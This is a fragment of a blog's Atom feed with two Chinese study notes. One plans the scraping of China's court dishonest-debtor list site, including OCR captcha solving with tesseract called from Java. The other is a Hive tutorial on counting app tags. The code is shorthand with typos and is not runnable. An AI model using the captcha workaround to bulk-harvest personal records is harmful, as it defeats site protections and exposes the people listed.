+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E5%A4%A7%E6%95%B0%E6%8D%AE/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Java" scheme="prayer007007.github.io/tags/Java/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="大数据" scheme="prayer007007.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
+    
+      <category term="Hadoop" scheme="prayer007007.github.io/tags/Hadoop/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>失信名单人爬取笔记01</title>
+    <link href="prayer007007.github.io/2018/09/10/%E5%A4%B1%E4%BF%A1%E5%90%8D%E5%8D%95%E4%BA%BA%E7%88%AC%E5%8F%96%E7%AC%94%E8%AE%B001/"/>
+    <id>prayer007007.github.io/2018/09/10/失信名单人爬取笔记01/</id>
+    <published>2018-09-09T19:12:31.000Z</published>
+    <updated>2018-09-09T11:14:05.968Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>失信名单人爬取http://shixin.court.gov.cn/数据采集复杂度确定1、是否为Https类采集，需要添加证书等操作2、是否需要模拟登陆3、模拟登陆的复杂度判定4、验证码复杂度5、站点反爬方式6、站点的反爬力度7、站点本身的个性方面：资源稀缺性、采集强度、采集量级要求</code></pre><a id="more"></a>    <pre><code>自前往后自后往前随机插入如果有Received，即意味着发生了改变//测试的时候可以通过Java GUI来得到输入的验证码VerifyGuiUtil verifyGuiUtil = new VerifyGuiUtil();String flag = &quot;login&quot;;String verify_code_input = verifyGuiUtil.getVerifyCode(flag,null,&quot;test_ts&quot;,1);sout(&quot;输入的验证码=&quot; + verify_code_input);自动采集分析：1、验证码可以重复输入支持2、tesseract安装与简单测试3、tesseract的验证码识别工具组件化4、tesseract识别失信人验证码cmd-&gt;in pwdtesseract.exe test.jpg ttttCmdProcessUtil.java: (部分)public static boolean process(String binPath,String paras){    BufferedReader br = null;    try{        Runtime runtime = Runtime.getRuntime();        String command_line = binPath + &quot; &quot; + paras;        logger.info(&quot;command_line ---&quot; + command_line);        Process process = runtime.exec(command_line);        InputStream is = process.getInputStream();        process.getErrorStream().close();        process.getOutputStream().close();        br = new BufferedReader(new InputStreamReader(is));        String temp = null;        while((temp = br.readline())!=null){            sout(temp);        }            return true;    }catch(){        logger.info(&quot;phantomjs 在爬取网页信息时出现异常，请检查&quot;);        logger.info(e.getLocalizedMessage());        return false;    }finally{        if(br != null){            try{                br.close();            }catch(){                xxx            }        }    }    psvm(){        String binPath = &quot;D:\\xxxx\\tesseract.exe&quot;;        String paras = &quot;verify.jpg result&quot;;        boolean exec_flag = CmdProcessUtil.process(binPath,paras);        String verify_code = IOUtil.readFile(&quot;result.txt&quot;,&quot;utf-8&quot;).trim();    }}</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;失信名单人爬取
+
+http://shixin.court.gov.cn/
+
+数据采集复杂度确定
+
+1、是否为Https类采集，需要添加证书等操作
+
+2、是否需要模拟登陆
+
+3、模拟登陆的复杂度判定
+
+4、验证码复杂度
+
+5、站点反爬方式
+
+6、站点的反爬力度
+
+7、站点本身的个性方面：资源稀缺性、采集强度、采集量级要求
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+    
+      <category term="Java" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/Java/"/>
+    
+      <category term="爬虫" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/Java/%E7%88%AC%E8%99%AB/"/>
+    
+      <category term="采集" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/Java/%E7%88%AC%E8%99%AB/%E9%87%87%E9%9B%86/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/Java/%E7%88%AC%E8%99%AB/%E9%87%87%E9%9B%86/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Java" scheme="prayer007007.github.io/tags/Java/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="大数据" scheme="prayer007007.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>大数据采集学习笔记01-实时热点</title>
+    <link href="prayer007007.github.io/2018/09/10/%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-%E5%AE%9E%E6%97%B6%E7%83%AD%E7%82%B9/"/>
+    <id>prayer007007.github.io/2018/09/10/大数据采集学习笔记01-实时热点/</id>
+    <published>2018-09-09T19:09:48.000Z</published>
+    <updated>2018-09-09T11:10:52.028Z</updated>
+    
+    <content type="html"><![CDATA[<pre><code>APP热点标签分析需求分析    给定一批app名称及其描述信息，共52.9万条数据    其内容结构为，共包含6个字段，分别为（appId,app名称，一级分类，二级分类，三级分类，Tags描述信息），但并不一定完全规整，视实际情况可能做对齐包括4个或5个或6个字段。    通过大数据开发之hive数据仓库命令行形式，完成数据加载，udf/udaf/udtf函数，统计分析的任务，并演示项目效果即可。主要思路    通过hive命令将数据加到数据仓库中    使用hql+udf/udaf/udtf完成统计分析    将统计分析结果插入到hive中自建的新表中主要考点    hive及hiveSQL常用命令    系统函数+udf/udaf/udtf灵活使用    hive常见问题的解决</code></pre><a id="more"></a>    <pre><code>技术组成：hive sql+udf/udaf/udtf步骤拆解：    1）输入，输出表设计到位            （1-0.4h）    2）将数据加载到输入表中            （1-04h）    3）hivesql+udf/udaf/udtf实现热词统计与写入库表    （1-0.5h）开发细节    4.0 prepare        1）相关目录创建            config:存放相关配置变量            create:存放表结构数据            deal:具体的sql脚本            udf:udf/udaf/udtf相关的jar包    4.1 按步骤执行5.bug修复，调优6.上线    6.1项目部署    6.2上线//输入表//怎么区分内表还是外表，外部引入的一般都是外表//规定一下分割，存储格式create external table app_tag_meta_info(id string,name string,first_classify string,second_classify string,third_classify string,tags string)#建成分区表partitioned by (dt string comment &apos;update date&apos;)row format delimited fields terminated by &apos;\t&apos; lines terminated by &apos;\n&apos;stored as textfile;touch config.sh 或者 touch set_env.sh#! /bin/bashHIVE=&apos;/usr/bin/hive&apos;#source set_env.sh            sh set_env.sh 不是在本窗口添加环境变量的，而是开了新窗口添加的环境变量//改权限chown -R hive 文件夹名.   -R为递归赋予hive权限[...config]#cd ../create/ touch app_tag_meta_info.sh#! /bin/bashsource ../config/set_env.shdb=&quot;job_002&quot;table_name=&quot;app_tag_meta_info&quot;$HIVE -e &quot;    use $db;    create external table $table_name(        id string,        name string,        first_classify string,        second_classify string,        third_classify string,        tags string    )    partitioned by (dt string comment &apos;update date&apos;)    row format delimited fields terminated by &apos;\t&apos; lines terminated by     &apos;\n&apos;    stored as textfile;&quot;# sh app_tag_meta_infouse job_002show tablesdesc app_tag_meta_info如果要修改.sh文件的话，不能直接修改，要删除已有的sh出来的表再重新建立drop table app_tag_meta_info;sh ....//输出表create table hot_tag_rank(    tag string,    freq int,)partitioned by (dt string comment &apos;update date&apos;)row format delimited fields terminated by &apos;\t&apos; lines terminated by     &apos;\n&apos;stored as textfile;sh app_tag_meta_info//将数据加载到数据表中[create] # ../dealrz -ytouch produce_app_tag_meta_info.sh#! /bin/bashsource ../config/set_env.shupdateDT=$1        //$1 即第一个传入的参数 一般放在最前面db=&quot;job_002&quot;table_name = &quot;app_tag_meta_info&quot;jar_path=&quot;&quot;class_path=&quot;&quot;data_source_path=&quot;app_abstract_info.txt&quot;$HIVE -e &quot;    use $db;    load data local inpath &apos;$data_source_path&apos; overwrite into table $table_name partition(dt=&apos;$updateDT&apos;)&quot;sh xxx.shselect * from app_tag_meta_info limit 10;show partitions app_tag_meta_info        //查看分区//setp1:找到tag字段select tags from app_tag_meta_info limit 10;//修改上句，改为集合select split(tags,&apos;,&apos;) from app_tag_meta_info limit 10;//再把上句改为字符串//setp2:拆分字段select explode(split(tags,&apos;,&apos;)) from app_tag_meta_info limit 10; (不采用)//step3:用lateral view包装select tag from app_tag_meta_info laterval view explode(split(tags,&apos;,&apos;)) tag_table as tag limit 10;  (采用)(即不使用 as tag 这种形式，避免了后面的where 无法使用tag的形式)//step4:bug解决和优化（去空格）select tag from app_tag_meta_info laterval view explode(split(tags,&apos;,&apos;)) tag_table as tag where tag !=&apos;&apos; limit 10;//按频次倒排select tag,count(1) as freq from app_tag_meta_info laterval view explode(split(tags,&apos;,&apos;)) tag_table as tag where tag !=&apos;&apos; and tag != &apos;-&apos; group by tag order by freq limit 10;        //这里select先执行order by后执行，所以可以看到前面的函数值set hive.execution.engine=tez;//将结果集写入到表中    分区表用overwrite写入insert overwrite table hot_tag_rank partition(dt=&apos;20180507&apos;)select tag,count(1) as freq from app_tag_meta_info laterval view explode(split(tags,&apos;,&apos;)) tag_table as tag where tag !=&apos;&apos; and tag != &apos;-&apos; and dt=&apos;20180507&apos; group by tag order by freq desc;//封装成sh#! /bin/bashsource ../config/set_env.shupdateDT=$1db=&quot;job_002&quot;table_name = &quot;hot_tag_rank&quot;jar_path=&quot;&quot;class_path=&quot;&quot;$HIVE -e &quot;    use $db;    set hive.execution.engine=tez;  //这里是设置引擎    insert overwrite table $table_name partition(dt=$updateDT&apos;)    select tag,count(1) as freq from app_tag_meta_info laterval view explode(split(tags,&apos;,&apos;)) tag_table as tag where tag !=&apos;&apos; and tag != &apos;-&apos; and dt=&apos;$updateDT&apos; group by tag order by freqd desc;&quot;//改bugsh xxxx.sh 20180507//写入口[deal]# touch a_main.sh#! /bin/bash#得到当前日期currentDT=&apos;date+%Y%m%d&apos;echo &quot;currentDT=&quot;$currentDT#将文本文件数据加载到app_tag_meta_info表中echo &quot;start load data to table process&quot;sh produce_app_tag_meta_info.sh $currentDTecho &quot;end&quot;#生成统计排序的热度标签数据echo &quot;start insert tag rank data&quot;sh produce_hot_tag_rank.sh $currentDTecho &quot;end&quot;echo &quot;all done!&quot;//nextcp hot_tag_rank.sh hot_tag_rank_rcfile.sh#! /bin/bashdb=&quot;job_002&quot;table_name=&quot;hot_tag_rank_rcfile&quot;$HIVE -e &quot;    use $db;    create table $table_name(        tag string,        freq int    )partitioned by (dt string comment &apos;update date&apos;)STORED AS rcfile;  //面向列分组&quot;# desc hot_tag_rank_rcfile# show create table hot_tag_rank_rcfile[deal]# cp produce_hot_tag_rank.sh produce_hot_tag_rank_rc.sh#! /bin/bashsource ../config/set_env.shupdateDT=$1db=&quot;job_002&quot;output_table_name_1 = &quot;hot_tag_rank_rcfile&quot;input_table_name_1 = &quot;app_tag_meta_info&quot;jar_path=&quot;&quot;class_path=&quot;&quot;$HIVE -e &quot;    use $db;    set hive.execution.engine=tez;  //这里是设置引擎    insert overwrite table $output_table_name_1 partition(dt=$updateDT&apos;)    select tag,count(1) as freq from $input_table_name_1 laterval view explode(split(tags,&apos;,&apos;)) tag_table as tag where tag !=&apos;&apos; and tag != &apos;-&apos; and dt=&apos;$updateDT&apos; group by tag order by freqd desc;&quot;vi a_main.sh#生成统计排序的热度标签数据echo &quot;start insert tag rank data&quot;sh produce_hot_tag_rank_rc.sh $currentDTecho &quot;end&quot;//查看变化//查找rcfile路径[slave]$ hdfs dfs -ls 路径出来路径之后在后面输入dt=20180507出现/dt=20180507/000000_0//再来一个不是rcfile的路径再在路径后面输入dt=20180507也是得到000000_0//查看里面的内容# hdfs dfs -text 空间大小 时间 /xxxx/xxx/dt=20180507/* | morercfile自带压缩。  所以rcfile空间大小要低一些hive --service rcfilecat /xxxxx/00000_0   //查看里面的内容,但是里面会乱码一般用select查看</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;pre&gt;&lt;code&gt;APP热点标签分析
+
+需求分析
+    给定一批app名称及其描述信息，共52.9万条数据
+    其内容结构为，共包含6个字段，分别为（appId,app名称，一级分类，二级分类，三级分类，Tags描述信息），但并不一定完全规整，视实际情况可能做对齐包括4个或5个或6个字段。
+    通过大数据开发之hive数据仓库命令行形式，完成数据加载，udf/udaf/udtf函数，统计分析的任务，并演示项目效果即可。
+主要思路
+    通过hive命令将数据加到数据仓库中
+    使用hql+udf/udaf/udtf完成统计分析
+    将统计分析结果插入到hive中自建的新表中
+主要考点
+    hive及hiveSQL常用命令
+    系统函数+udf/udaf/udtf灵活使用
+    hive常见问题的解决
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
+    
+      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
+    
+      <category term="大数据" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
+    
+      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E5%A4%A7%E6%95%B0%E6%8D%AE/%E5%9F%BA%E7%A1%80/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E5%A4%A7%E6%95%B0%E6%8D%AE/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="Java" scheme="prayer007007.github.io/tags/Java/"/>
+    
+      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+      <category term="大数据" scheme="prayer007007.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
     
   </entry>
   
